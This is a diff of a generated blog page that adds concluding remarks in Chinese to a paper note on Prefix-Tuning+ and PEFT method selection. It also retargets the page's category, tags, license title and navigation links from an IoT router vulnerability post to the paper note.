+<h3 id="The-Future"><a href="#The-Future" class="headerlink" title="The Future"></a>The Future</h3><ul>
+<li>PEFT 的设计空间仍未穷尽：LoRA 虽强，但 Prefix-Tuning+ 说明前缀式方法仍有潜力可挖。</li>
+<li><strong>解耦是一个非常值得关注的思路</strong>：本文提出了将<strong>前缀从注意力竞争中解放出来</strong>，这种思路是否可以用到其他类似的“共享机制”策略的改进？</li>
+<li><strong>根据实际去做选型参考</strong>：当任务中输入长度变化大或者前缀过长，需进行计算开销来选取PMT还是LoRA</li>
 </ul>
 
                 
@@ -629,7 +640,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/IOT/" class="category-chain-item">IOT</a>
+  <a href="/categories/Paper/" class="category-chain-item">Paper</a>
   
   
 
@@ -644,9 +655,13 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/IOT/" class="print-no-link">#IOT</a>
+        <a href="/tags/PEFT/" class="print-no-link">#PEFT</a>
       
-        <a href="/tags/CVE/" class="print-no-link">#CVE</a>
+        <a href="/tags/prefix-Tuning/" class="print-no-link">#prefix Tuning</a>
+      
+        <a href="/tags/llm-code-generation/" class="print-no-link">#llm code generation</a>
+      
+        <a href="/tags/AI-Safety/" class="print-no-link">#AI Safety</a>
       
     </div>
   
@@ -658,8 +673,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>华为HG532远程代码执行漏洞复现</div>
-      <div>https://zer0ptr.github.io/2026/05/23/iot-huawei-hg532-rce/</div>
+      <div>【论文笔记】Prefix-Tuning+: Modernizing Prefix-Tuning through Attention Independent Prefix Data</div>
+      <div>https://zer0ptr.github.io/2026/05/23/prefix-tunning-plus/</div>
     </div>
     <div class="license-meta">
       
@@ -708,18 +723,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/05/23/prefix-tunning-plus/" title="【论文笔记】Prefix-Tuning+: Modernizing Prefix-Tuning through Attention Independent Prefix Data">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【论文笔记】Prefix-Tuning+: Modernizing Prefix-Tuning through Attention Independent Prefix Data</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/05/06/unitree-debug-learning-1/" title="如何在不拆开机器狗的情况下优雅地对其进行二开">
-                        <span class="hidden-mobile">如何在不拆开机器狗的情况下优雅地对其进行二开</span>
+                      <a href="/2026/05/23/iot-huawei-hg532-rce/" title="华为HG532远程代码执行漏洞复现">
+                        <span class="hidden-mobile">华为HG532远程代码执行漏洞复现</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
